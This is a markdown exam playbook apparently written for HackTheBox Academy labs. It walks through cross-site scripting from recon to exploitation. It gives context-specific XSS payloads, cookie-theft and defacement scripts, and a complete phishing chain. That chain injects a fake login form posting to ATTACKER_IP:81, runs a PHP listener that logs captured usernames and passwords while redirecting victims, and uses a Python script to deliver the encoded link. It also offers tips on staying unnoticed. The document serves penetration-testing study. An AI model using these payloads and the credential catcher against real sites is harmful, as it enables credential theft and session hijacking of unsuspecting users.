# NOTE — XSS Pentest Methodology (Exam Playbook)

## ID
700

## Module
Cross-Site Scripting (XSS)

## Kind
methodology

## Title
Cross-Site Scripting (XSS) — Full Pentest Methodology

## Description
End-to-end exam-ready playbook for XSS: input recon → type classification → context-aware payload → weaponization → delivery → post-exploitation. Use as a decision tree under time pressure.

## Tags
methodology, xss, exam, cheatsheet, decision-tree, stored-xss, reflected-xss, dom-xss, phishing, xsstrike

---

## TL;DR — The 6-Phase Flow

1. **Recon** every input vector — forms, URL params, hash fragments, headers (`Cookie`, `User-Agent`).
2. **Classify** the XSS type by the persistence test and where the input is processed (DB / response / DOM).
3. **Probe** with `<script>alert(window.origin)</script>` — read the rendered HTML to see the exact injection context.
4. **Tailor** the payload to context (plain HTML vs attribute breakout vs `innerHTML` event-handler).
5. **Weaponize** for the goal — cookie theft, defacement, phishing — and host any listener you need.
6. **Deliver & harvest** — for Reflected/DOM the link must reach the victim; for Stored, every visitor fires.

> **Golden rule:** Always view the page source FIRST. The breakout sequence (`'>` vs `">` vs none) is dictated by how your input renders, not by guesswork.

---

## Phase 1 — Recon & Input Discovery

### Find every input vector
- Forms (`<input>`, `<textarea>`), URL query params (`?param=…`), URL fragments (`#param=…`), JSON bodies.
- HTTP headers — `Cookie`, `User-Agent`, `Referer` are valid injection points if reflected on the page.
- Walk the app with both an authenticated and unauthenticated session — different roles may reach different sinks.

```bash
# Pull form fields and parameter names from a page
curl -s http://<TARGET>:<PORT>/ | grep -i "input\|name=\|action="
```

### Submit the form first
Some apps reject single-param submissions ("validation failed") and only echo input back when *all* fields are populated. **Submit the registration / contact form once normally, capture the resulting URL with every parameter, then test from there.** Skipping this step is the #1 reason XSStrike returns "No reflection found" on a vulnerable target.

### Tools
| Use | Tool |
|---|---|
| Automated XSS scan | XSStrike, Burp Pro Active Scan, OWASP ZAP, Nessus |
| Payload lists | PayloadsAllTheThings, Payload-Box |
| Manual context inspection | DevTools → Inspector + View Source (`Ctrl+U`) |

```bash
git clone https://github.com/s0md3v/XSStrike.git
pip install -r requirements.txt
python xsstrike.py -u "http://<TARGET>:<PORT>/index.php?<PARAM>=test&<OTHER>=test"
```
Look for **"Reflections found"** in the output, then verify manually — automated tools throw false negatives constantly.

---

## Phase 2 — Classify the XSS Type

| Signal | Type | Why |
|---|---|---|
| Payload still fires after refreshing the page (no payload in URL) | **Stored** | Saved in DB, served to every visitor |
| Fires only when payload is in the URL/request; refresh without it = nothing | **Reflected** | Echoed live in response, not stored |
| URL contains `#fragment`, no HTTP request fires when input changes (DevTools Network is silent) | **DOM** | Fully client-side; server never sees `#` |

### Quick checks
- **Persistence test:** inject → refresh page without the payload in the URL. Fires? → Stored. Doesn't fire? → Reflected (or DOM).
- **Network test (DevTools → Network):** no request when input changes → DOM.
- **Source visibility:** payload appears in `Ctrl+U` page source → server-rendered (Stored/Reflected). Only visible in Inspector after JS runs → DOM.

---

## Phase 3 — Context-Aware Payload Selection

**View the page source first.** How your input is wrapped dictates the payload.

| Render context | Breakout | Payload |
|---|---|---|
| Plain HTML body — `<div>INPUT</div>` | none needed | `<script>alert(window.origin)</script>` |
| Single-quoted attribute — `<img src='INPUT'>` | `'>` to close attr+tag | `'><script>alert(window.origin)</script>` |
| Double-quoted attribute — `<input value="INPUT">` | `">` | `"><script>alert(window.origin)</script>` |
| `innerHTML` / DOM Sink | `<script>` is silently ignored | `<img src="" onerror=alert(window.origin)>` |
| Inside an existing `<script>` block | close the string / tag | `';alert(1);//` or `</script><script>alert(1)</script>` |

### Confirmation payloads (when `alert()` is blocked)
- `<script>print()</script>` — triggers print dialog.
- `<plaintext>` — stops HTML rendering, makes injection visible.

### Why `<img src="" onerror=…>` is the universal DOM-XSS payload
`innerHTML` strips `<script>` for safety, but any HTML element with an event handler still fires. Empty `src=""` guarantees image load fails → `onerror` fires reliably.

### Common DOM Sinks (read the JS — find these)
`document.write()`, `document.writeln()`, `innerHTML`, `outerHTML`, `document.domain`, jQuery `html()`, `append()`, `prepend()`, `after()`, `before()`, `replaceWith()`, `add()`, `insertAfter()`, `insertBefore()`, `parseHTML()`, `replaceAll()`.

---

## Phase 4 — Weaponize by Goal

### 4.1 Cookie / Session Theft
```html
<script>alert(document.cookie)</script>
```
Reflected delivery — full URL example:
```
http://<TARGET>:<PORT>/index.php?task=<script>alert(document.cookie)</script>
```
DOM delivery (fragment):
```
http://<TARGET>:<PORT>/#task=<img src="" onerror=alert(document.cookie)>
```
**Note:** cookies with `HttpOnly` flag will not appear in `document.cookie` — but you can still ride the session via `XMLHttpRequest` because the browser auto-attaches the cookie.

### 4.2 Defacement (requires Stored XSS)
```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
<script>document.title = 'HackTheBox Academy'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```
Minify the `innerHTML` HTML string — newlines break the payload.

### 4.3 Phishing / Credential Capture (Reflected XSS chain)
The standard cleanup chain: **`document.write()` → inject form → `getElementById().remove()` → `<!--`** to comment out leftover original HTML.

```javascript
'><script>document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP:81><input type=username name=username placeholder=Username><input type=password name=password placeholder=Password><input type=submit name=submit value=Login></form>');document.getElementById('urlform').remove();</script><!--
```

Hosts a fake login that POSTs to your listener. The trailing `<!--` swallows the broken HTML left from your breakout.

---

## Phase 5 — Listener Setup & Delivery (Phishing Path)

### 5.1 PHP credential catcher (preferred over `nc`)
PHP silently logs creds and redirects the victim to the real page — no error visible to the victim. `nc` catches the request but returns garbage to the browser, which is suspicious.

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
cat > index.php << 'EOF'
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://TARGET_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
EOF
sudo php -S 0.0.0.0:81
```
**Port 80 is usually taken by Apache** — use 81 / 8080 and update the `<form action=...>` in your payload to match.

### 5.2 Send the malicious URL
If the app's submission form rejects raw payloads ("Invalid URL!"), URL-encode and POST programmatically:

```python
import requests, urllib.parse
target  = "TARGET_IP"
my_ip   = "ATTACKER_IP"
payload = (
    f"'><script>document.write('<h3>Please login to continue</h3>"
    f"<form action=http://{my_ip}:81>"
    f"<input type=username name=username placeholder=Username>"
    f"<input type=password name=password placeholder=Password>"
    f"<input type=submit name=submit value=Login></form>');"
    f"document.getElementById('urlform').remove();</script><!--"
)
encoded  = urllib.parse.quote(payload)
full_url = f"http://{target}/phishing/index.php?url={encoded}"
r = requests.post(f"http://{target}/phishing/send.php", data={"url": full_url})
print("[+] Sent!" if "Invalid" not in r.text else "[-] Rejected")
```

### 5.3 Harvest
```bash
cat /tmp/tmpserver/creds.txt
# Username: admin | Password: p1zd0nt57341myp455
```
Use captured creds to log into the real app endpoint (`/phishing/login.php` in the lab).

---

## Decision Tree (Under Exam Pressure)

```
Input vector identified
│
├── Does input come back in the response?
│   │
│   ├── YES — appears in page source (Ctrl+U)
│   │   │
│   │   ├── Refresh page WITHOUT payload — does it still fire?
│   │   │   ├── YES → STORED XSS  (most critical, hits all visitors)
│   │   │   └── NO  → REFLECTED XSS (needs phishing link)
│   │   │
│   │   └── Pick payload by context:
│   │       ├── Plain body          → <script>alert(window.origin)</script>
│   │       ├── Inside attr 'INPUT' → '><script>alert(window.origin)</script>
│   │       ├── Inside attr "INPUT" → "><script>alert(window.origin)</script>
│   │       └── Inside <script>     → ';alert(1);// or </script><script>alert(1)</script>
│   │
│   └── NO — input only visible in Inspector, not in source
│       │
│       └── DOM XSS (DevTools Network is silent, # fragment in URL)
│           │
│           ├── Read script.js — find the Source (where JS reads input) + Sink (where it's written)
│           ├── If Sink = innerHTML / document.write → use event-handler payload:
│           │     <img src="" onerror=alert(document.cookie)>
│           └── Deliver via fragment: http://T/#task=<PAYLOAD>
│
├── Goal?
│   ├── Confirm-only           → alert(window.origin) / alert(document.cookie)
│   ├── Defacement (Stored)    → document.body.* + innerHTML overwrite
│   └── Phishing (Reflected)   → document.write fake form → PHP listener → harvest
│
└── alert() blocked?  →  print() or <plaintext> as fallback
```

---

## Filter / Signal → Bypass Reference

| Signal observed | Likely cause | Counter-move |
|---|---|---|
| `<script>` in payload disappears, page renders fine | `innerHTML` strips `<script>` | Switch to `<img src="" onerror=…>` |
| Error message shows empty `''` where payload was | `<script>` content has no visual rendering | This is normal — check page source to confirm injection landed |
| XSStrike says "No reflection found" on every param | App requires all params populated | Submit the real form first, then test the resulting full URL |
| Payload breaks when pasted from a tool | Auto URL-encoding mangled it | Type it manually in the address bar OR re-encode cleanly with `urllib.parse.quote()` |
| Address bar URL-encodes your `<` `>` automatically | Browser strict mode | Use the form input instead, or `curl`/Python to send the request |
| `alert()` silently fails | Sandboxed iframe / browser policy | `<script>print()</script>` or `<plaintext>` |
| `send.php` returns "Invalid URL!" | Server-side URL validation | URL-encode the payload portion, POST programmatically |
| `php -S 0.0.0.0:80` → "Address already in use" | Apache holds port 80 | Use 81/8080; update form action in payload to match |
| `bash: !script: event not found` while building payload | `!` triggers history expansion in double quotes | Use single-quoted heredoc OR Python script |
| `document.cookie` returns nothing or partial | `HttpOnly` flag set on session cookies | Cookies invisible to JS — pivot to session-riding via XHR |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === Scenario 1: Stored XSS confirmation ===
# Inject in any persistent input (To-Do, comment, profile):
<script>alert(window.origin)</script>
# Refresh — if it fires again, it's Stored.

# === Scenario 2: Reflected XSS — weaponized link ===
http://<TARGET>:<PORT>/index.php?task=<script>alert(document.cookie)</script>

# === Scenario 3: DOM XSS — fragment payload ===
http://<TARGET>:<PORT>/#task=<img src="" onerror=alert(document.cookie)>

# === Scenario 4: Discover params + scan ===
curl -s http://<TARGET>:<PORT>/ | grep -i "input\|name=\|action="
# Submit the form normally → copy resulting full URL
python xsstrike.py -u "http://<TARGET>:<PORT>/index.php?fullname=test&username=test&password=123&email=test@email.com"

# === Scenario 5: Defacement (requires Stored) ===
<script>document.title='HackTheBox Academy'</script>
<script>document.body.style.background='#141d2b'</script>
<script>document.getElementsByTagName('body')[0].innerHTML='<center><h1 style="color:white">Pwned</h1></center>'</script>

# === Scenario 6: Phishing chain — full payload ===
'><script>document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP:81><input type=username name=username><input type=password name=password><input type=submit value=Login></form>');document.getElementById('urlform').remove();</script><!--

# === Scenario 7: PHP listener (terminal 1) ===
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# write index.php (see Phase 5.1)
sudo php -S 0.0.0.0:81

# === Scenario 8: Harvest ===
cat /tmp/tmpserver/creds.txt
```

---

## Top Gotchas (Things That Will Burn You)

1. **Single-param XSStrike scans miss vulns** — submit the real form first to get a full URL with every parameter populated, then scan that URL. The app may only echo input when *all* fields are present.
2. **`<script>` content has no visible output** — the error message shows an empty `''` where your payload sits. Don't conclude failure; check page source.
3. **Don't waste time on `<script>` inside `innerHTML`** — it's silently ignored. Jump straight to `<img src="" onerror=…>` or another event-handler payload.
4. **Page source (`Ctrl+U`) is blind to DOM XSS** — payloads injected via JS only exist in the rendered DOM. Use the Inspector, not the source view.
5. **`#` fragment ≠ server input** — the fragment never leaves the browser, so server-side WAFs and logs are blind. Useful for stealth, but means you can't grep server logs to confirm.
6. **`HttpOnly` defeats `document.cookie`** — but the attacker can still send authenticated XHRs because the browser auto-attaches the cookie. Use session riding instead.
7. **Always use `window.origin` in confirmation alerts** — confirms which domain/iframe is actually executing your code (cross-domain iframes can fool you).
8. **Address bar auto-URL-encodes `<` and `>`** — copy-paste failures often = encoding, not a real block. Type manually or use the input field.
9. **PHP listener > netcat** for phishing — `nc` returns garbage to the victim, which screams "something's wrong". PHP logs silently and 302-redirects them to the real page.
10. **Port 80 is usually busy** — `sudo php -S 0.0.0.0:80` fails with "Address already in use" because Apache. Use 81/8080 and **update the `<form action=...>` in your payload to match the new port**.
11. **Bash `event not found`** — `!` in double-quoted strings triggers history expansion. Use single-quoted heredocs or build the payload in Python instead of bash.
12. **`send.php` rejects payloads with "Invalid URL!"** — URL-encode the payload section with `urllib.parse.quote()` and POST it via Python `requests`.
13. **Form action port and PHP server port MUST match** — easy to forget after switching from 80 → 81. Both your payload's `action=…:81` and `php -S 0.0.0.0:81` must agree.
14. **Reset button on labs wipes Stored XSS DB** — handy for clean retests, but if you walk away and come back, your payload may already be gone.
15. **`alert()` blocked in sandboxed iframes** — fall back to `<script>print()</script>` (print dialog) or `<plaintext>` (kills HTML rendering and makes injection visible).
16. **Headers as XSS vectors** — `Cookie`, `User-Agent`, `Referer` are real injection points when their values are rendered. Don't limit testing to form fields.

---

## Reference Wordlists & Resources

| Use case | Resource |
|---|---|
| XSS payload encyclopedia | `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection` |
| Payload generator | `https://github.com/payloadbox/xss-payload-list` |
| Automated discovery | XSStrike — `https://github.com/s0md3v/XSStrike` |

---

## Related Vault Notes

- `01-intro.md` — XSS theory, three types, OWASP impact
- `02-stored-xss.md` — persistent XSS via DB, basic confirmation payloads
- `03-reflected-xss.md` — non-persistent, GET-based weaponization
- `04-dom-xss.md` — Source/Sink model, `#` fragments, event-handler payloads
- `05-xss-discovery.md` — XSStrike, manual recon, full-URL scanning
- `06-defacing.md` — DOM manipulation via Stored XSS
- `07-xss-phishing.md` — full Reflected → fake form → PHP listener → harvest chain
- `09-xss-prevention.md` — defender's view: encoding, CSP, HttpOnly, DOMPurify
